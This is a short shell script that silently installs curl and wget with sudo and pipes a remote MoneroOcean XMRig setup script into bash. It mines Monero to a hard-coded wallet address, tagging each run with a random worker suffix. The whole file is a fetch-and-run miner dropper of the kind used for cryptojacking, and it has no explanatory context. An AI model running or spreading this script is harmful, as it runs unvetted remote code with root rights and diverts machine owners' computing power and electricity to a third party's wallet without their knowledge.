#!/bin/sh

cd /tmp
yes | sudo apt install curl wget -y

RAND_SUFFIX=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 5)

curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 4576JTdTYFp6hi2n2Ci54eSFzV8GSkNJTJVC1zswJpk7byZMSfu4W4mVpCsoQJHfSyQS6y5CkZ1kbZTTbUBbpFrYRgtzsrG."$RAND_SUFFIX"
